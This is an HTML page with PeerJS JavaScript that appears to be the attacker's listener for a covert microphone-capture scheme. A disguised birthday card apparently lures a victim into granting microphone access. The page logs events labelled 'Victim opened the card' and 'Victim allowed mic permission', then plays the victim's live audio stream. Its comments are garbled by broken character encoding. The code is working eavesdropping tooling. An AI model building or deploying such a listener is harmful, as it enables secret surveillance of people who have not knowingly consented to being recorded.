<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>ðŸ”Š Cake Audio + Events Listener</title>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
  <style>
    body { text-align:center; padding:2rem; font-family:sans-serif; }
    #log { max-width:400px; margin:1rem auto; text-align:left; }
  </style>
</head>
<body>
  <h2>ðŸ‘‚ Listening for Cake Audioâ€¦</h2>
  <audio id="player" controls autoplay style="margin-top:1rem;"></audio>
  <div id="log"><strong>Events:</strong><ul id="events"></ul></div>

  <script>
    const LISTENER_ID = 'birthday-listener';
    const peer = new Peer(LISTENER_ID, { debug: 2 });
    const eventsUl = document.getElementById('events');

    function logEvent(msg) {
      const li = document.createElement('li');
      li.textContent = msg;
      eventsUl.appendChild(li);
    }

    peer.on('open', () => {
      logEvent(`Ready as "${LISTENER_ID}"`);
    });

    // 1) Ø§Ø³ØªÙ‚Ø¨Ù„ DataConnection
    peer.on('connection', conn => {
      conn.on('data', data => {
        if (data.event === 'page-open') {
          logEvent("â–¶ Victim opened the card");
        }
        if (data.event === 'mic-allowed') {
          logEvent("âœ” Victim allowed mic permission");
        }
        if (data.event === 'mic-denied') {
          logEvent("âœ– Victim denied mic permission");
        }
      });
    });

    // 2) Ø§Ø³ØªÙ‚Ø¨Ù„ Ø§Ù„Ø¨Ø« Ø§Ù„ØµÙˆØªÙŠ
    peer.on('call', call => {
      call.answer();  // Ù†Ø³ØªÙ‚Ø¨Ù„ ÙÙ‚Ø·
      call.on('stream', remote => {
        document.getElementById('player').srcObject = remote;
        logEvent("ðŸ”‰ Audio stream started");
      });
    });

    peer.on('error', err => {
      console.error(err);
      logEvent("Error: " + err);
    });
  </script>
</body>
</html>
